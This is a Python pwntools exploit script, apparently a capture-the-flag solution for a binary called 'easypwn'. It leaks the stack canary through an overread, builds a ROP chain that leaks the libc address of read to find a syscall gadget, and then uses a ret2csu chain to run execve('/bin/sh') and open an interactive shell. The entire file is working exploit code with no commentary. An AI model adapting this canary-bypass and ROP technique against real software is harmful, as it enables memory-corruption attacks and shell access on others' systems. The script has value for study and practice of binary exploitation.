#/usr/env/bin python
from pwn import *

elf = ELF('./easypwn')
io = process('./easypwn')

io.recvuntil(b'Who are you?\n')
io.sendline(b'A'*(0x50-0x8))
io.recvuntil(b'A'*(0x50-0x8)) 
canary = u64(io.recv(8))-0xa
log.info('canary:'+hex(canary))

io.recvuntil(b'tell me your real name?\n')
payload = b'A'*(0x50-0x8)
payload += p64(canary)
payload += b'A'*0x8
payload += p64(0x4007f3)
payload += p64(elf.got['read'])	
payload += p64(elf.plt['puts'])
payload += p64(0x4006C6)
io.send(payload)
io.recvuntil(b'See you again!\n')

read_addr = u64(io.recvuntil(b'\n',drop=True).ljust(0x8,b'\x00'))
log.info('read_addr:'+hex(read_addr))
syscall = read_addr+0xe
log.info('syscall:'+hex(syscall))
sleep(0.5)
io.recvuntil(b'Who are you?\n')
io.sendline(b'A'*(0x50-0x8))

io.recvuntil(b'tell me your real name?\n')
payload = b'A'*(0x50-0x8)
payload += p64(canary)
payload += b'A'*0x8
payload += p64(0x4007EA)
payload += p64(0)+p64(1)+p64(elf.got['read'])+p64(0x3B)+p64(0x601060)+p64(0)
payload += p64(0x4007D0)
payload += p64(0)
payload += p64(0)+p64(1)+p64(0x601068)+p64(0)+p64(0)+p64(0x601060)
payload += p64(0x4007D0)
 
io.send(payload)
sleep(0.5)
content = b'/bin/sh\x00'+p64(syscall)
content = content.ljust(0x3B,b'A')
io.send(content)
io.interactive()